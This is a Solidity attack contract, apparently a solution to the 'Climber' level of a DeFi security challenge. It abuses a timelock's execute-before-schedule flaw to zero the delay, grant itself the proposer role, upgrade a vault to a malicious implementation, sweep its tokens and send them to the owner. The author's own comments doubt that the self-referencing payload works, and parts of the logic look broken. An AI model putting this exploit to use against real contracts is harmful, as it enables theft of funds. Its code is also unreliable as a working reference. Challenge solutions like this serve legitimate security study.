// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

pragma solidity ^0.8.0;

interface ITimelock {
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external payable;
}

interface IVault {
    function sweepFunds(address tokenAddress) external;
}

contract ClimberAttack {

    ITimelock timelock;
    address vaultAddress;
    address maliciousVaultAddress;
    address tokenAddress;

    address owner;

    constructor(
        address _timelockAddress,
        address _vaultAddress,
        address _maliciousVaultAddress,
        address _tokenAddress
    ) {
        owner = msg.sender;
        timelock = ITimelock(_timelockAddress);
        vaultAddress = _vaultAddress;
        maliciousVaultAddress = _maliciousVaultAddress;
        tokenAddress = _tokenAddress;
    }

    function triggerAttack() external {
        require(msg.sender == owner, "Only owner allowed");

        bytes memory maliciousInitializePayload = abi.encodeWithSignature("initialize(address)", address(this));

        address[] memory _addresses = new address[](4);
        _addresses[0] = address(timelock);
        _addresses[1] = address(timelock);
        _addresses[2] = vaultAddress;
        _addresses[3] = address(this);

        uint256[] memory _values = new uint256[](4);
        _values[0] = 0;
        _values[1] = 0;
        _values[2] = 0;
        _values[3] = 0;

        bytes[] memory _dataElements = new bytes[](4);
        _dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
        _dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousVaultAddress, maliciousInitializePayload);
        _dataElements[3] = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", _addresses, _values, _dataElements, bytes32(bytes("salty")));
        // note - will this self-reference to _dataElements work? 
        // 'Address: low-level call with value failed' <- is this due to self-reference

        timelock.execute(
            _addresses, // address[] calldata targets 
            _values, // uint256[] calldata values
            _dataElements, // bytes[] calldata dataElements
            bytes32(bytes("salty")) //bytes32 salt
        );

        IVault(maliciousVaultAddress).sweepFunds(tokenAddress);

        IERC20 _token = IERC20(tokenAddress);
        require(_token.transfer(owner, _token.balanceOf(address(this))), "Transfer failed");

    }

}